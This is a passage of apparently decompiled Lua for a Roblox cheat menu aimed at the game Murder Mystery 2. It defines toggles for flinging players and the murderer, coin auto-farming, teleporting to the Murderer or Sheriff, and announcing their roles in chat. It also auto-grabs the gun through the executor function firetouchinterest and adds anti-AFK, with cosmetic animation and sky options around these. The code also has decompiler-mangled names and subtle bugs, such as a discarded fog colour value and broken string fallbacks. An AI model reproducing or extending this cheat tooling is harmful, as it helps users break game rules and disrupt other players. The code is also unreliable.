    _G.ExtremeFlingEnabled = p101
    t3.value72(p101)
    v32()
end
})
t3.value126.Player:AddDivider()
t1.value2 = t3.value126.Player:AddCollapsibleSection("Easy Glitching", "lucide/wand", true)

function t1.value23(p102)
    _G.EasyGlitch = p102
    t3.value95(p102)
    v32()
end
t1.value2:AddToggle("EasyGlitchToggle", {
	Title = "Easy Glitching",
	Default = false,
	Callback = t1.value23
})
t1.value15 = t3.value126.Player:AddCollapsibleSection("Fake Die", "lucide/skull", true)
t1.value15:AddButton({
	Title = "Lay On Back",
	Callback = function()
    local Character = t3.value11.Character
    local v332 = Character and Character:FindFirstChildOfClass("Humanoid")

    if v332 then
        v332.Sit = true
        task.wait(0.1)

        local v333 = v332.RootPart or Character:FindFirstChild("HumanoidRootPart")

        if v333 then
            v333.CFrame = v333.CFrame * CFrame.Angles(1.5707963267948966, 0, 0)
        end

        local GetPlayingAnimationTracks = v332.GetPlayingAnimationTracks

        for _, v in ipairs(GetPlayingAnimationTracks(v332)) do
            v:Stop()
        end
    end
end
})
t1.value15:AddButton({
	Title = "Sit Down",
	Callback = t1.value7
})
t3.value126.Player:AddDivider()
t1.value24 = t3.value126.Player:AddCollapsibleSection("Extra", "lucide/plus", true)
t1.value25 = t1.value24.AddToggle
function t1.value29(p103)
    t3.value47 = p103

    if not p103 then
        t3.value12.CameraSubject = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")
        t3.value18("Spectate", "Spectate disabled", "Info", nil, 2)
    end

    v32()
end
t1.value25(t1.value24, "SpectateToggle", {
	Title = "Enable Spectate",
	Default = false,
	Callback = t1.value29
})
local v36 = t3.value51()
t3.value26 = t1.value24:AddDropdown("SpectateTarget", {
	Title = "Spectate Player",
	Values = v36,
	Default = "",
	Multi = false,
	Callback = function(p104)
    t3.value75(p104)
end
})
t1.value26 = t1.value24.AddButton
function t1.value23()
    t3.value74()
end
t1.value26(t1.value24, {
	Title = "Refresh Spectate List",
	Callback = t1.value23
})
t1.value24:AddToggle("CTRL+Click Teleport (PC)", {
	Title = "Enable",
	Default = false,
	Callback = function(p105)
    t3.value76 = p105
    v32()
end
})
t1.value24:AddButton({
	Title = "Send Sheriff & Murderer names to chat",
	Callback = t1.value38
})
t3.value126.AutoFarm:AddSection("Coin Farm")
t1.value26 = t3.value126.AutoFarm
t1.value23 = t1.value26.AddToggle
t1.value23(t1.value26, "CoinFarmToggle", {
	Title = "Enable Coin Farm",
	Default = false,
	Callback = function(p106)
    toggleCoinFarm(p106)
    v32()
end
})
t1.value26 = t3.value126.AutoFarm
t1.value23 = t1.value26.AddSlider
function t1.value25(p107)
    _G.CoinFarmSpeed = p107
    v32()
end
t1.value23(t1.value26, "CoinFarmSpeed", {
	Title = "Farm Speed",
	Min = 1,
	Max = 30,
	Default = 25,
	Rounding = 0,
	Callback = t1.value25
})
t1.value26 = t3.value126.AutoFarm
t1.value23 = t1.value26.AddSlider
function t1.value25(p108)
    _G.CoinFarmRadius = p108
    v32()
end
t1.value23(t1.value26, "CoinFarmRadius", {
	Title = "Search Radius",
	Min = 50,
	Max = 500,
	Default = 200,
	Rounding = 0,
	Callback = t1.value25
})
t1.value26 = t3.value126.AutoFarm
t1.value23 = t1.value26.AddDropdown
t1.value29 = {
	"Normal",
	"Head"
}
t1.value23(t1.value26, "CoinCollectMethod", {
	Title = "Collect Method",
	Values = t1.value29,
	Default = "Normal",
	Callback = function(p109)
    _G.CoinCollectMethod = p109
    v32()
end
})
t1.value26 = t3.value126.AutoFarm
t1.value23 = t1.value26.AddSlider
function t1.value25(p110)
    _G.MaxCoinsPerRound = p110
    v32()
end
t1.value23(t1.value26, "MaxCoinsPerRound", {
	Title = "Max Coins Before Reset",
	Min = 10,
	Max = 100,
	Default = 40,
	Rounding = 0,
	Callback = t1.value25
})
t1.value26 = t3.value126.AutoFarm
t1.value23 = t1.value26.AddToggle
t1.value23(t1.value26, "AutoFlingMurderer", {
	Title = "Auto Fling Murderer on Reset",
	Default = false,
	Callback = function(p111)
    _G.AutoFlingMurderer = p111
    v32()
end
})
t1.value26 = t3.value126.AutoFarm
t1.value23 = t1.value26.AddButton
t1.value23(t1.value26, {
	Title = "Fling Murderer Now",
	Callback = function()
    local v488 = t3.value54("Murderer") or findMurdererForFarm()

    if v488 then
        task.spawn(function()
            t3.value68(v488)
        end)
        t3.value18("Fling", "Flinged murderer: " .. v488.Name, "Success", nil, 3)

        return
    end

    t3.value18("Fling", "Murderer not found!", "Error", nil, 2)
end
})
t3.value126.Whitelist:AddSection("Whitelist")
t1.value26 = t3.value126.Whitelist
t1.value23 = t1.value26.AddToggle
t1.value23(t1.value26, "WhitelistOn", {
	Title = "Enable",
	Default = false,
	Callback = function(p112)
    _G.WhitelistEnabled = p112
    v32()
end
})
t1.value26 = t3.value126.Whitelist
t1.value23 = t1.value26.AddToggle
t1.value23(t1.value26, "WhitelistFriends", {
	Title = "Friends",
	Default = false,
	Callback = function(p113)
    _G.WhitelistFriends = p113
    v32()
end
})
t1.value26 = t3.value126.Whitelist
local v37 = t3.value51()
function t1.value15(p114)
    _G.WhitelistPlayers = p114
    v32()
end
t1.value26:AddDropdown("WhitelistPlayers", {
	Title = "Players",
	Values = v37,
	Default = {},
	Multi = true,
	Callback = t1.value15
})
t1.value26 = _G
t1.value23 = "SelectedAnimation"
t1.value29 = _G.SelectedAnimation or {}
t1.value26[t1.value23] = t1.value29
function t1.value29(p115)
    local Animate = p115:FindFirstChild("Animate")

    if not Animate then
        return
    end

    local SelectedAnimation = _G.SelectedAnimation

    if not SelectedAnimation or not SelectedAnimation.idle1 then
        return
    end

    if Animate:FindFirstChild("idle") then
        local idle = Animate.idle

        if idle:FindFirstChild("Animation1") and SelectedAnimation.idle1 then
            idle.Animation1.AnimationId = SelectedAnimation.idle1
        end

        if idle:FindFirstChild("Animation2") and SelectedAnimation.idle2 then
            idle.Animation2.AnimationId = SelectedAnimation.idle2
        end
    end

    if Animate:FindFirstChild("walk") and (Animate.walk:FindFirstChild("WalkAnim") and SelectedAnimation.walk) then
        Animate.walk.WalkAnim.AnimationId = SelectedAnimation.walk
    end

    if Animate:FindFirstChild("run") and (Animate.run:FindFirstChild("RunAnim") and SelectedAnimation.run) then
        Animate.run.RunAnim.AnimationId = SelectedAnimation.run
    end

    if Animate:FindFirstChild("jump") and (Animate.jump:FindFirstChild("JumpAnim") and SelectedAnimation.jump) then
        Animate.jump.JumpAnim.AnimationId = SelectedAnimation.jump
    end

    if Animate:FindFirstChild("climb") and (Animate.climb:FindFirstChild("ClimbAnim") and SelectedAnimation.climb) then
        Animate.climb.ClimbAnim.AnimationId = SelectedAnimation.climb
    end

    if Animate:FindFirstChild("fall") and (Animate.fall:FindFirstChild("FallAnim") and SelectedAnimation.fall) then
        Animate.fall.FallAnim.AnimationId = SelectedAnimation.fall
    end

    if Animate:FindFirstChild("swimidle") and (Animate.swimidle:FindFirstChild("SwimIdle") and SelectedAnimation.swimIdle) then
        Animate.swimidle.SwimIdle.AnimationId = SelectedAnimation.swimIdle
    end

    if Animate:FindFirstChild("swim") and (Animate.swim:FindFirstChild("Swim") and SelectedAnimation.swim) then
        Animate.swim.Swim.AnimationId = SelectedAnimation.swim
    end

    local Humanoid = p115:FindFirstChildOfClass("Humanoid")

    if Humanoid then
        Humanoid.Jump = true
        task.wait(0.05)
        Humanoid.Jump = false
    end
end
function t1.value23(p116, p117, p118, p119, p120, p121, p122, p123, p124)
    _G.SelectedAnimation = {
		idle1 = p116,
		idle2 = p117,
		walk = p118,
		run = p119,
		jump = p120,
		climb = p121,
		fall = p122,
		swimIdle = p123,
		swim = p124
	}

    local Character = t3.value11.Character

    if not Character then
        return
    end

    local Animate = Character:FindFirstChild("Animate")

    if not Animate then
        return
    end

    if Animate:FindFirstChild("idle") then
        local idle = Animate.idle

        if idle:FindFirstChild("Animation1") then
            idle.Animation1.AnimationId = p116
        end

        if idle:FindFirstChild("Animation2") then
            idle.Animation2.AnimationId = p117
        end
    end

    if Animate:FindFirstChild("walk") and Animate.walk:FindFirstChild("WalkAnim") then
        Animate.walk.WalkAnim.AnimationId = p118
    end

    if Animate:FindFirstChild("run") and Animate.run:FindFirstChild("RunAnim") then
        Animate.run.RunAnim.AnimationId = p119
    end

    if Animate:FindFirstChild("jump") and Animate.jump:FindFirstChild("JumpAnim") then
        Animate.jump.JumpAnim.AnimationId = p120
    end

    if Animate:FindFirstChild("climb") and Animate.climb:FindFirstChild("ClimbAnim") then
        Animate.climb.ClimbAnim.AnimationId = p121
    end

    if Animate:FindFirstChild("fall") and Animate.fall:FindFirstChild("FallAnim") then
        Animate.fall.FallAnim.AnimationId = p122
    end

    if Animate:FindFirstChild("swimidle") and Animate.swimidle:FindFirstChild("SwimIdle") then
        Animate.swimidle.SwimIdle.AnimationId = p123
    end

    if Animate:FindFirstChild("swim") and Animate.swim:FindFirstChild("Swim") then
        Animate.swim.Swim.AnimationId = p124
    end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")

    if Humanoid then
        Humanoid.Jump = true
        task.wait(0.05)
        Humanoid.Jump = false
    end
end
t3.value139 = t1.value23
t3.value140 = t1.value29
t1.value29 = t3.value11.CharacterAdded
t1.value29:Connect(function(p125)
    task.wait(0.5)
    t3.value140(p125)
end)
t1.value14 = t3.value11
if t1.value14.Character then
    task.wait(0.5)
    t3.value140(t3.value11.Character)
end
t3.value126.Emotes:AddSection("Emotes (click to play)")
t1.value14 = t3.value126.Emotes
t1.value14:AddButton({
	Title = "Sit",
	Callback = function()
    if t3.value21 then
        local s2 = "sit"

        pcall(function()
            t3.value21:Fire(s2)
        end)

        return
    end

    t3.value18("Error", "Emote remote not found", "Error", nil, 2)
end
})
t1.value14 = t3.value126.Emotes
t1.value14:AddButton({
	Title = "Zen",
	Callback = function()
    if t3.value21 then
        local s3 = "zen"

        pcall(function()
            t3.value21:Fire(s3)
        end)

        return
    end

    t3.value18("Error", "Emote remote not found", "Error", nil, 2)
end
})
t1.value14 = t3.value126.Emotes
t1.value14.AddButton(t1.value14, {
	Title = "Dab",
	Callback = function()
    if t3.value21 then
        local s4 = "dab"

        pcall(function()
            t3.value21:Fire(s4)
        end)

        return
    end

    t3.value18("Error", "Emote remote not found", "Error", nil, 2)
end
})
t1.value14 = t3.value126.Emotes
t1.value14.AddButton(t1.value14, {
	Title = "Floss",
	Callback = function()
    if t3.value21 then
        local s5 = "floss"

        pcall(function()
            t3.value21:Fire(s5)
        end)

        return
    end

    t3.value18("Error", "Emote remote not found", "Error", nil, 2)
end
})
t1.value14 = t3.value126.Emotes
t1.value14.AddButton(t1.value14, {
	Title = "Zombie",
	Callback = function()
    if t3.value21 then
        local s6 = "zombie"

        pcall(function()
            t3.value21:Fire(s6)
        end)

        return
    end

    t3.value18("Error", "Emote remote not found", "Error", nil, 2)
end
})
t1.value14 = t3.value126.Emotes
t1.value14.AddButton(t1.value14, {
	Title = "Headless",
	Callback = function()
    if t3.value21 then
        local s7 = "headless"

        pcall(function()
            t3.value21:Fire(s7)
        end)

        return
    end

    t3.value18("Error", "Emote remote not found", "Error", nil, 2)
end
})
t3.value126.Emotes:AddDivider()
local v38 = t3.value126.Emotes:AddCollapsibleSection("Normal Animations", "lucide/activity", true)

t1.value23 = {
	name = "Astronaut",
	idle1 = "891621366",
	idle2 = "891633237",
	walk = "891667138",
	run = "891636393",
	jump = "891627522",
	climb = "891609353",
	fall = "891617961"
}
local t37 = {
	name = "Bubbly",
	idle1 = "910004836",
	idle2 = "910009958",
	walk = "910034870",
	run = "910025107",
	jump = "910016857",
	climb = "",
	fall = "910001910",
	swimIdle = "910030921",
	swim = "910028158"
}
t1.value29 = {
	name = "Cartoony",
	idle1 = "742637544",
	idle2 = "742638445",
	walk = "742640026",
	run = "742638842",
	jump = "742637942",
	climb = "742636889",
	fall = "742637151"
}
local t38 = {
	name = "Elder",
	idle1 = "845397899",
	idle2 = "845400520",
	walk = "845403856",
	run = "845386501",
	jump = "845398858",
	climb = "845392038",
	fall = "845396048"
}
local t39 = {
	name = "Knight",
	idle1 = "657595757",
	idle2 = "657568135",
	walk = "657552124",
	run = "657564596",
	jump = "658409194",
	climb = "658360781",
	fall = "657600338"
}
local t40 = {
	name = "Levitation",
	idle1 = "616006778",
	idle2 = "616008087",
	walk = "616013216",
	run = "616010382",
	jump = "616008936",
	climb = "616003713",
	fall = "616005863"
}
local t41 = {
	name = "Mage",
	idle1 = "707742142",
	idle2 = "707855907",
	walk = "707897309",
	run = "707861613",
	jump = "707853694",
	climb = "707826056",
	fall = "707829716"
}
t1.value7 = {
	name = "Ninja",
	idle1 = "656117400",
	idle2 = "656118341",
	walk = "656121766",
	run = "656118852",
	jump = "656117878",
	climb = "656114359",
	fall = "656115606"
}
t1.value15 = {
	name = "Pirate",
	idle1 = "750781874",
	idle2 = "750782770",
	walk = "750785693",
	run = "750783738",
	jump = "750782230",
	climb = "750779899",
	fall = "750780242"
}
t1.value4 = {
	name = "Robot",
	idle1 = "616088211",
	idle2 = "616089559",
	walk = "616095330",
	run = "616091570",
	jump = "616090535",
	climb = "616086039",
	fall = "616087089"
}
t1.value25 = {
	name = "Stylish",
	idle1 = "616136790",
	idle2 = "616138447",
	walk = "616146177",
	run = "616140816",
	jump = "616139451",
	climb = "616133594",
	fall = "616134815"
}
t1.value21 = {
	name = "SuperHero",
	idle1 = "616111295",
	idle2 = "616113536",
	walk = "616122287",
	run = "616117076",
	jump = "616115533",
	climb = "616104706",
	fall = "616108001"
}
t1.value13 = {
	name = "Toy",
	idle1 = "782841498",
	idle2 = "782845736",
	walk = "782843345",
	run = "782842708",
	jump = "782847020",
	climb = "782843869",
	fall = "782846423"
}
t1.value38 = {
	name = "Vampire",
	idle1 = "1083445855",
	idle2 = "1083450166",
	walk = "1083473930",
	run = "1083462077",
	jump = "1083455352",
	climb = "1083439238",
	fall = "1083443587"
}
t1.value12 = {
	name = "Werewolf",
	idle1 = "1083195517",
	idle2 = "1083214717",
	walk = "1083178339",
	run = "1083216690",
	jump = "1083218792",
	climb = "1083182000",
	fall = "1083189019"
}
t1.value2 = {
	name = "Zombie",
	idle1 = "616158929",
	idle2 = "616160636",
	walk = "616168032",
	run = "616163682",
	jump = "616161997",
	climb = "616156119",
	fall = "616157476"
}
t1.value14 = {
	t1.value23,
	t37,
	t1.value29,
	t38,
	t39,
	t40,
	t41,
	t1.value7,
	t1.value15,
	t1.value4,
	t1.value25,
	t1.value21,
	t1.value13,
	t1.value38,
	t1.value12,
	t1.value2
}
for _, v in ipairs(t1.value14) do
    local v46 = v

    t1.value15 = v46.name

    local AddButton = v38.AddButton

    function t1.value25()
        t3.value139("http://www.roblox.com/asset/?id=" .. v46.idle1, "http://www.roblox.com/asset/?id=" .. v46.idle2 or v46.idle1, "http://www.roblox.com/asset/?id=" .. v46.walk or "", "http://www.roblox.com/asset/?id=" .. (v46.run or ""), "http://www.roblox.com/asset/?id=" .. (v46.jump or ""), "http://www.roblox.com/asset/?id=" .. (v46.climb or ""), "http://www.roblox.com/asset/?id=" .. (v46.fall or ""), "http://www.roblox.com/asset/?id=" .. (v46.swimIdle or ""), "http://www.roblox.com/asset/?id=" .. v46.swim or "")
        t3.value18("Animation", "Changed to " .. v46.name, "Success", nil, 2)
    end

    AddButton(v38, {
		Title = t1.value15,
		Callback = t1.value25
	})
end
local v48 = t3.value126.Emotes:AddCollapsibleSection("Special Animations", "lucide/star", true)

t1.value29 = {
	name = "Patrol",
	idle1 = "1149612882",
	idle2 = "1150842221",
	walk = "1151231493",
	run = "1150967949",
	jump = "1148811837",
	climb = "1148811837",
	fall = "1148863382"
}
local t42 = {
	name = "Confident",
	idle1 = "1069977950",
	idle2 = "1069987858",
	walk = "1070017263",
	run = "1070001516",
	jump = "1069984524",
	climb = "1069946257",
	fall = "1069973677"
}
local t43 = {
	name = "Popstar",
	idle1 = "1212900985",
	idle2 = "1150842221",
	walk = "1212980338",
	run = "1212980348",
	jump = "1212954642",
	climb = "1213044953",
	fall = "1212900995"
}
local t44 = {
	name = "Cowboy",
	idle1 = "1014390418",
	idle2 = "1014398616",
	walk = "1014421541",
	run = "1014401683",
	jump = "1014394726",
	climb = "1014380606",
	fall = "1014384571"
}
local t45 = {
	name = "Ghost",
	idle1 = "616006778",
	idle2 = "616008087",
	walk = "616013216",
	run = "616013216",
	jump = "616008936",
	climb = "",
	fall = "616005863",
	swimIdle = "616012453",
	swim = "616011509"
}
t1.value7 = {
	name = "Sneaky",
	idle1 = "1132473842",
	idle2 = "1132477671",
	walk = "1132510133",
	run = "1132494274",
	jump = "1132489853",
	climb = "1132461372",
	fall = "1132469004"
}
t1.value15 = {
	name = "Princess",
	idle1 = "941003647",
	idle2 = "941013098",
	walk = "941028902",
	run = "941015281",
	jump = "941008832",
	climb = "940996062",
	fall = "941000007"
}
t1.value23 = {
	t1.value29,
	t42,
	t43,
	t44,
	t45,
	t1.value7,
	t1.value15
}
for _, v in ipairs(t1.value23) do
    local v55 = v

    t1.value25 = v55.name

    function t1.value13()
        t3.value139("http://www.roblox.com/asset/?id=" .. v55.idle1, "http://www.roblox.com/asset/?id=" .. (v55.idle2 or v55.idle1), "http://www.roblox.com/asset/?id=" .. v55.walk or "", "http://www.roblox.com/asset/?id=" .. v55.run or "", "http://www.roblox.com/asset/?id=" .. (v55.jump or ""), "http://www.roblox.com/asset/?id=" .. (v55.climb or ""), "http://www.roblox.com/asset/?id=" .. v55.fall or "", "http://www.roblox.com/asset/?id=" .. v55.swimIdle or "", "http://www.roblox.com/asset/?id=" .. v55.swim or "")
        t3.value18("Animation", "Changed to " .. v55.name, "Success", nil, 2)
    end

    t1.value15 = {
		Title = t1.value25,
		Callback = t1.value13
	}
    v48:AddButton(t1.value15)
end
local v56 = t3.value126.Emotes:AddCollapsibleSection("Other", "lucide/more-horizontal", true)

t1.value29 = v56.AddButton
function t1.value15()
    t3.value139("", "", "", "", "", "", "", "", "")
    t3.value18("Animation", "Cleared all animations", "Info", nil, 2)
end
t1.value29(v56, {
	Title = "None (Clear)",
	Callback = t1.value15
})
t1.value29 = v56.AddButton
function t1.value15()
    t3.value139("http://www.roblox.com/asset/?id=2510196951", "http://www.roblox.com/asset/?id=2510197257", "http://www.roblox.com/asset/?id=2510202577", "http://www.roblox.com/asset/?id=2510198475", "http://www.roblox.com/asset/?id=2510197830", "http://www.roblox.com/asset/?id=2510192778", "http://www.roblox.com/asset/?id=2510195892", "", "")
    t3.value18("Animation", "Set to Anthro default", "Success", nil, 2)
end
t1.value29(v56, {
	Title = "Anthro (Default)",
	Callback = t1.value15
})
t3.value126.Teleport:AddSection("Teleports")
t3.value126.Teleport:AddButton({
	Title = "Teleport to Map Spawn",
	Callback = t1.value34
})
t1.value29 = t3.value126.Teleport
function t1.value4()
    local v518 = t3.value54("Murderer")

    if v518 and (v518.Character and v518.Character:FindFirstChild("HumanoidRootPart")) then
        t3.value11.Character.HumanoidRootPart.CFrame = v518.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
    end
end
t1.value29:AddButton({
	Title = "Teleport to Murderer",
	Callback = t1.value4
})
t1.value29 = t3.value126.Teleport
local AddButton = t1.value29.AddButton
function t1.value4()
    local v519 = t3.value54("Sheriff")

    if v519 and (v519.Character and v519.Character:FindFirstChild("HumanoidRootPart")) then
        t3.value11.Character.HumanoidRootPart.CFrame = v519.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
    end
end
AddButton(t1.value29, {
	Title = "Teleport to Sheriff",
	Callback = t1.value4
})
local v58 = t3.value126.Misc:AddCollapsibleSection("Auto Grab Gun", "lucide/hand", true)

t1.value29 = v58.AddToggle
function t1.value13(p126)
    _G.AutoGrabEnabled = p126
    v32()
end
t1.value29(v58, "AutoGrab", {
	Title = "Auto Grab Gun",
	Default = false,
	Callback = t1.value13
})
function t1.value13()
    local v521 = false
    local v522, v523, v524 = pairs(t3.value30)
    local g526
    repeat
        local v525

        v524, v525 = v522(v523, v524)

        if not v524 then
            g526 = true
        end

        if g526 then
            break
        end
    until v524 and v524.Parent
    if not g526 then
        v521 = true
    end
    if not v521 then
        t3.value18("Error", "No dropped gun!", "Error", nil, 2)

        return
    end
    local Character = t3.value11.Character
    local v528 = Character and Character:FindFirstChild("HumanoidRootPart")
    if v528 then
        for k, _ in pairs(t3.value30) do
            local v531 = k

            if v531 and v531.Parent then
                v531:PivotTo(v528.CFrame)

                if not (v531:FindFirstChild("TouchInterest", true) or v531:FindFirstChildWhichIsA("TouchTransmitter", true)) then
                    return
                end

                firetouchinterest(v528, v531, 0)
                task.wait()
                firetouchinterest(v528, v531, 1)

                return
            end
        end
    end
end
v58:AddKeybind("GrabKey", {
	Title = "Manual Grab",
	Default = "G",
	Callback = t1.value13
})
t3.value126.Misc:AddDivider()
local v59 = t3.value126.Misc:AddCollapsibleSection("Notifications", "lucide/bell", true)

t1.value29 = v59.AddToggle
function t1.value38(p127)
    _G.SayRoleEnabled = p127
    v32()
end
t1.value29(v59, "SayRole", {
	Title = "Show role on round start",
	Default = false,
	Callback = t1.value38
})
t1.value29 = v59.AddToggle
function t1.value38(p128)
    t3.value81(p128)
    v32()
end
t1.value29(v59, "RoundTimer", {
	Title = "Round Timer (MM2)",
	Default = false,
	Callback = t1.value38
})
t3.value126.Misc:AddDivider()
local v60 = t3.value126.Misc:AddCollapsibleSection("Anti-AFK", "lucide/clock", true)

t1.value29 = v60.AddToggle
function t1.value12(p129)
    _G.AntiAfkEnabled = p129
    t3.value94(p129)
    v32()
end
t1.value29(v60, "AntiAfk", {
	Title = "Anti AFK",
	Default = true,
	Callback = t1.value12
})
t3.value126.Misc:AddDivider()
t1.value7 = t3.value126.Misc:AddCollapsibleSection("Utilities", "lucide/tool", true)
t1.value7:AddButton({
	Title = "Rejoin",
	Callback = t1.value33
})
t1.value7:AddButton({
	Title = "Respawn",
	Callback = t1.value6
})
t1.value15 = t3.value126.Atmosphere:AddCollapsibleSection("Sky Presets", "lucide/cloud-sun", true)

function t1.value25()
    for _, child in ipairs(t3.value17:GetChildren()) do
        if child:IsA("Sky") then
            child:Destroy()
        end
    end
end
t3.value141 = t1.value15
t3.value142 = nil
t3.value143 = t1.value25
function t1.value21(p130, p131)
    local v541 = t3.value141:AddToggle(p130 .. "SkyToggle", {
		Title = p130,
		Default = false
	})
    local u542 = v541
    u542:OnChanged(function(p132)
        if p132 then
            if t3.value142 and t3.value142 ~= u542 then
                t3.value142:SetValue(false)
            end

            t3.value142 = u542

            local v843 = p131

            t3.value143()

            local Sky = Instance.new("Sky")

            Sky.Parent = t3.value17
            Sky.CelestialBodiesShown = false
            Sky.SkyboxBk = v843
            Sky.SkyboxDn = v843
            Sky.SkyboxFt = v843
            Sky.SkyboxLf = v843
            Sky.SkyboxRt = v843
            Sky.SkyboxUp = v843
            t3.value18("Sky", p130 .. " applied", "Success", nil, 2)

            return
        end

        if t3.value142 == u542 then
            t3.value143()
            t3.value18("Sky", "Sky restored to default", "Info", nil, 2)
        end
    end)

    return u542
end
t1.value21("Full Night", "http://www.roblox.com/asset/?id=17055447520")
t1.value21("Black Hole", "http://www.roblox.com/asset/?id=17108753749")
t1.value21("Neptune", "http://www.roblox.com/asset/?id=17108745046")
t1.value21("Lofy Sky", "http://www.roblox.com/asset/?id=17108732394")
t1.value21("Aurora Boreal", "http://www.roblox.com/asset/?id=17108721907")
t3.value126.Atmosphere:AddDivider()
t3.value126.Atmosphere:AddCollapsibleSection("RTX Shaders", "lucide/sparkles", true):AddToggle("RTXShaders", {
	Title = "RTX Shaders",
	Default = false
}):OnChanged(function(p133)
    _G.RTXShaders = p133

    if p133 then
        pcall(function()
            local BloomEffect = Instance.new("BloomEffect", t3.value17)

            BloomEffect.Name = "RTX_Bloom"
            BloomEffect.Intensity = 0.1
            BloomEffect.Size = 100

            local ColorCorrectionEffect = Instance.new("ColorCorrectionEffect", t3.value17)

            ColorCorrectionEffect.Name = "RTX_CC"
            ColorCorrectionEffect.Saturation = 0.05
            ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 224, 219)

            local SunRaysEffect = Instance.new("SunRaysEffect", t3.value17)

            SunRaysEffect.Name = "RTX_SunRays"
            SunRaysEffect.Intensity = 0.05
            t3.value17.Brightness = 2.14
            t3.value17.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
            t3.value17.ColorShift_Top = Color3.fromRGB(240, 127, 14)
            t3.value17.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
            t3.value17.ClockTime = 6.7
        end)
        t3.value18("RTX Shaders", "Enabled", "Success", nil, 3)

        return
    end

    for _, child in ipairs(t3.value17:GetChildren()) do
        if child.Name:find("RTX") then
            child:Destroy()
        end
    end

    t3.value17.Brightness = 2
    t3.value17.ColorShift_Bottom = Color3.new(0, 0, 0)
    t3.value17.ColorShift_Top = Color3.new(0, 0, 0)
    t3.value17.OutdoorAmbient = Color3.fromRGB(157, 157, 157)
    t3.value17.ClockTime = 14
    t3.value18("RTX Shaders", "Disabled", "Info", nil, 2)
end)
t3.value126.Atmosphere:AddDivider()
t1.value2 = t3.value126.Atmosphere:AddCollapsibleSection("Environment Controls", "lucide/sun", true)
t1.value12 = t3.value17.ClockTime
t3.value144 = t1.value12
t1.value12 = t3.value17.FogStart
t3.value145 = t1.value12
t1.value12 = t3.value17.FogEnd
t3.value146 = t1.value12
t1.value12 = t3.value17.FogColor
t3.value147 = t1.value12
t3.value148 = false
t3.value149 = 50
t1.value37 = Color3.fromRGB(255, 255, 255)
t3.value150 = t1.value37
function t3.value151()
    if t3.value148 then
        t3.value17.FogStart = 0
        t3.value17.FogEnd = 1000 - t3.value149 * 10
        t3.value17.FogColor = t3.value150

        return
    end

    t3.value17.FogStart = t3.value145
    t3.value17.FogEnd = t3.value146
    t3.value17.FogColor = t3.value147
end
local ClockTime = t3.value17.ClockTime
t1.value2.AddSlider(t1.value2, "TimeOfDaySlider", {
	Title = "Time of Day",
	Min = 0,
	Max = 24,
	Default = ClockTime,
	Rounding = 0.5,
	Callback = function(p134)
    t3.value17.ClockTime = p134
end
})
t1.value2.AddToggle(t1.value2, "FogToggle", {
	Title = "Enable Fog",
	Default = false,
	Callback = function(p135)
    t3.value148 = p135
    t3.value151()
    t3.value18("Fog", not t3.value148 and "Disabled" or "Enabled", "Info", nil, 2)
end
})
t1.value2.AddSlider(t1.value2, "FogDensitySlider", {
	Title = "Fog Density",
	Min = 0,
	Max = 100,
	Default = 50,
	Rounding = 0,
	Callback = function(p136)
    if t3.value148 then
        t3.value151()
        t3.value18("Fog", "Density: " .. p136, "Info", nil, 1)
    end
end
})
local AddDropdown = t1.value2.AddDropdown
t1.value7 = {
	"White",
	"Gray",
	"Black",
	"Blue",
	"Red",
	"Green",
	"Purple",
	"Orange"
}
AddDropdown(t1.value2, "FogColorDropdown", {
	Title = "Fog Color",
	Values = t1.value7,
	Multi = false,
	Default = "White",
	Callback = function(p137)
    local color3_5 = Color3.fromRGB(255, 255, 255)
    local color3_6 = Color3.fromRGB(128, 128, 128)
    local color3_7 = Color3.fromRGB(0, 0, 0)
    local color3_8 = Color3.fromRGB(100, 150, 255)
    local color3_9 = Color3.fromRGB(255, 80, 80)
    local color3_10 = Color3.fromRGB(80, 255, 80)
    local color3_11 = Color3.fromRGB(200, 100, 255)
    local color3_12 = Color3.fromRGB(255, 180, 50)

    if not ({
			White = color3_5,
			Gray = color3_6,
			Black = color3_7,
			Blue = color3_8,
			Red = color3_9,
			Green = color3_10,
			Purple = color3_11,
			Orange = color3_12
		})[p137] then
        Color3.fromRGB(255, 255, 255)
    end

    if t3.value148 then
        t3.value151()
        t3.value18("Fog", "Color: " .. p137, "Info", nil, 1)
    end
end
})
t1.value2.AddButton(t1.value2, {
	Title = "Reset Environment",
	Callback = function()
    t3.value17.ClockTime = t3.value144
    t3.value17.FogStart = t3.value145
    t3.value17.FogEnd = t3.value146
    t3.value17.FogColor = t3.value147
    Color3.fromRGB(255, 255, 255)
    pcall(function()
        Options.TimeOfDaySlider:SetValue(t3.value144)
        Options.FogToggle:SetValue(false)
        Options.FogDensitySlider:SetValue(50)
        Options.FogColorDropdown:SetValue("White")
    end)
    t3.value18("Environment", "Reset to defaults", "Info", nil, 2)
end
})
t3.value126.Settings:AddSection("Theme")

local Settings = t3.value126.Settings
t1.value2 = t3.value22
t1.value7 = t3.value22[1]
t1.value30 = Settings.AddDropdown
t1.value30(Settings, "ThemeSelect", {
	Title = "UI Theme",
	Values = t1.value2,
	Default = t1.value7,
	Callback = function(p138)
    _G.Theme = p138
    pcall(function()
        t3.value7:SetTheme(p138)
    end)
    v32()
end
})
t1.value30 = _G
if t1.value30.ExtremeFlingEnabled then
    function t1.value2()
        Options.ExtremeFlingToggle:SetValue(true)
        t3.value72(true)
    end

    pcall(t1.value2)
end
t3.value126.Settings:AddDivider()
t3.value152 = {
	["Blue (Ryo)"] = "rbxassetid://110300998910160",
	["Red (Kita)"] = "rbxassetid://125644682328750",
	["Pink (Bocchi)"] = "rbxassetid://100823211487117",
	["Yellow (Nijika)"] = "rbxassetid://90908656139712",
	Crimson = "rbxassetid://132324914333495",
	Gold = "rbxassetid://107795771598485",
	AMOLED = "rbxassetid://134736124666311"
}
local t46 = {}
for k in pairs(t3.value152) do
    table.insert(t46, k)
end
table.sort(t46)
t1.value2 = t3.value126.Settings
local v66 = t46[1]

t1.value2:AddDropdown("BackgroundSelect", {
	Title = "Background Image",
	Values = t46,
	Default = v66,
	Callback = function(p139)
    local v560 = t3.value152[p139]

    if v560 then
        pcall(function()
            local AcrylicPaint = t3.value24.AcrylicPaint

            if AcrylicPaint and AcrylicPaint.Frame then
                local __ThemeBG = AcrylicPaint.Frame:FindFirstChild("__ThemeBG")

                if __ThemeBG then
